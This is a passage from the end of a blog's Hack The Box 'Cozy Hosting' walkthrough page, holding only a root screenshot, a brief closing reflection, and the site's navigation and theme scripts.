+<p><a href="#R-image-c856335d78cfc29e56708d5a1e4b5eae" class="lightbox-link"><img src="/walkthroughs/cozyhosting/root.png" alt="root" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-c856335d78cfc29e56708d5a1e4b5eae"><img src="/walkthroughs/cozyhosting/root.png" alt="root" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Even though it is categorized as an &ldquo;easy&rdquo; machines I still found myself met with a few challenges along the way, but ultimately learned a lot and was able to add to my methodology.</p>
+
+            <footer class="footline">
+            </footer>
+          </article>
+        </div>
+      </main>
+    </div>
+    <aside id="R-sidebar" class="default-animation">
+      <div id="R-header-topbar" class="default-animation"></div>
+      <div id="R-header-wrapper" class="default-animation">
+        <div id="R-header" class="default-animation">
+<a href="/index.html">
+    <img src="/images/logo.png" 
+        width="200"
+        height="120"
+        alt="Website logo of hacker cat"/>
+    <h2 style="padding:0; margin:0;">H1roBytes</h2>
+</a>
+        </div>
+        <div class="searchbox default-animation">
+          <i class="fas fa-search" title="Search (CTRL+ALT+f)"></i>
+          <label class="a11y-only" for="R-search-by">Search</label>
+          <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
+          <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-times" title="Clear search"></i></button>
+        </div>
+        <script>
+          var contentLangs=['en'];
+        </script>
+        <script src="/js/auto-complete.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.stemmer.support.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.multi.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.en.min.js?1738202701" defer></script>
+        <script src="/js/search.js?1738202701" defer></script>
+      </div>
+      <div id="R-homelinks" class="default-animation">
+        <hr class="padding">
+      </div>
+      <div id="R-content-wrapper" class="highlightable">
+        <div id="R-topics">
+          <ul class="enlarge morespace collapsible-menu">
+          <li data-nav-id="/walkthroughs/index.html" class="parent "><input type="checkbox" id="R-section-a25630664138ae6b33064dc3d9c0b30e" aria-controls="R-subsections-a25630664138ae6b33064dc3d9c0b30e" checked><label for="R-section-a25630664138ae6b33064dc3d9c0b30e"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu Walkthroughs</span></label><a class="padding" href="/walkthroughs/index.html">Walkthroughs</a><ul id="R-subsections-a25630664138ae6b33064dc3d9c0b30e" class="morespace collapsible-menu">
+          <li data-nav-id="/walkthroughs/2023-advent-of-cyber/index.html" class=""><a class="padding" href="/walkthroughs/2023-advent-of-cyber/index.html">Advent of Cyber 2023! - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/cozyhosting/index.html" class="active"><a class="padding" href="/walkthroughs/cozyhosting/index.html">Cozy Hosting - Hack The Box</a></li>
+          <li data-nav-id="/walkthroughs/kenobi/index.html" class=""><a class="padding" href="/walkthroughs/kenobi/index.html">Kenobi - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/nibbles/index.html" class=""><a class="padding" href="/walkthroughs/nibbles/index.html">Nibbles - HTB</a></li>
+          <li data-nav-id="/walkthroughs/red-team-engagements/index.html" class=""><a class="padding" href="/walkthroughs/red-team-engagements/index.html">Red Team Engagements - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/red-team-fundamentals/index.html" class=""><a class="padding" href="/walkthroughs/red-team-fundamentals/index.html">Red Team Fundamentals - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/rootme/index.html" class=""><a class="padding" href="/walkthroughs/rootme/index.html">RootMe - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/steel-mountain/index.html" class=""><a class="padding" href="/walkthroughs/steel-mountain/index.html">Steel Mountain - TryHackMe</a></li></ul></li>
+          <li data-nav-id="/resources/index.html" class=""><input type="checkbox" id="R-section-4fbbb0c8ab4cb18ef7db60d823ac6d24" aria-controls="R-subsections-4fbbb0c8ab4cb18ef7db60d823ac6d24"><label for="R-section-4fbbb0c8ab4cb18ef7db60d823ac6d24"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu Resources</span></label><a class="padding" href="/resources/index.html">Resources</a><ul id="R-subsections-4fbbb0c8ab4cb18ef7db60d823ac6d24" class="morespace collapsible-menu">
+          <li data-nav-id="/resources/active-directory-enumeration/index.html" class=""><a class="padding" href="/resources/active-directory-enumeration/index.html">Active Directory Enumeration</a></li></ul></li>
+          <li data-nav-id="/contact/index.html" class=""><a class="padding" href="/contact/index.html">Contact</a></li>
+          </ul>
+        </div>
+        <div class="padding footermargin footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showVariantSwitch showFooter"></div>
+        <div id="R-menu-footer">
+          <hr class="padding default-animation footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showVariantSwitch showFooter">
+          <div id="R-prefooter" class="footerLangSwitch footerVariantSwitch footerVisitedLinks showVariantSwitch">
+            <ul>
+              <li id="R-select-language-container" class="footerLangSwitch">
+                <div class="padding menu-control">
+                  <i class="fas fa-language fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-language">Language</label>
+                    <select id="R-select-language" onchange="location = baseUri + this.value;">
+                      <option id="R-en" value="/walkthroughs/cozyhosting/index.html" lang="en" selected></option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+              <li id="R-select-variant-container" class="footerVariantSwitch showVariantSwitch">
+                <div class="padding menu-control">
+                  <i class="fas fa-paint-brush fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-variant">Theme</label>
+                    <select id="R-select-variant" onchange="window.variants && variants.changeVariant( this.value );">
+                      <option id="R-relearn-dark" value="relearn-dark" selected>Relearn Dark</option>
+                      <option id="R-zen-dark" value="zen-dark">Zen Dark</option>
+                      <option id="R-relearn-bright" value="relearn-bright">Relearn Bright</option>
+                      <option id="R-relearn-light" value="relearn-light">Relearn Light</option>
+                      <option id="R-zen-light" value="zen-light">Zen Light</option>
+                      <option id="R-neon" value="neon">Neon</option>
+                      <option id="R-learn" value="learn">Learn</option>
+                      <option id="R-blue" value="blue">Blue</option>
+                      <option id="R-green" value="green">Green</option>
+                      <option id="R-red" value="red">Red</option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+                <script>window.variants && variants.markSelectedVariant();</script>
+              </li>
+              <li class="footerVisitedLinks">
+                <div class="padding menu-control">
+                  <i class="fas fa-history fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <button onclick="clearHistory();">Clear History</button>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+            </ul>
+          </div>
+          <div id="R-footer" class="footerFooter showFooter">
+	    <p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p>
+		<p><a href="https://hirobytes.xyz/disclaimer">Disclaimer</a></p>
+          </div>
+        </div>
+      </div>
+    </aside>
+    <script src="/js/clipboard.min.js?1738202701" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1738202701" defer></script>
+    <script>
+      function useMathJax( config ){
+        if( !Object.assign ){
+          
+          return;
+        }
+        window.MathJax = Object.assign( window.MathJax || {}, {
+          loader: {
+            load: ['[tex]/mhchem']
+          },
+          startup: {
+            elements: [
+              '.math'
+            ]
+          },
+          tex: {
+            inlineMath: [
+              ['$', '$'], 
+              ['\\(', '\\)']
+            ]
+          },
+          options: {
+            enableMenu: false 
+          }
+        }, config );
+      }
+      useMathJax( JSON.parse( null ) );
+    </script>
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    <script src="/js/d3/d3-color.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1738202701" defer></script>
+    <script src="/js/js-yaml.min.js?1738202701" defer></script>
+    <script src="https://unpkg.com/mermaid/dist/mermaid.min.js" defer></script>
+    <script>
+      window.themeUseMermaid = JSON.parse( null );
+    </script>
+    <script>window.noZensmooth = true;</script>
+    <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-bundle.js" defer></script>
+    <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-standalone-preset.js" defer></script>
+    <script>
+      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1738202701  };
+    </script>
+    <script src="/js/theme.js?1738202701" defer></script>
+  </body>
+</html>
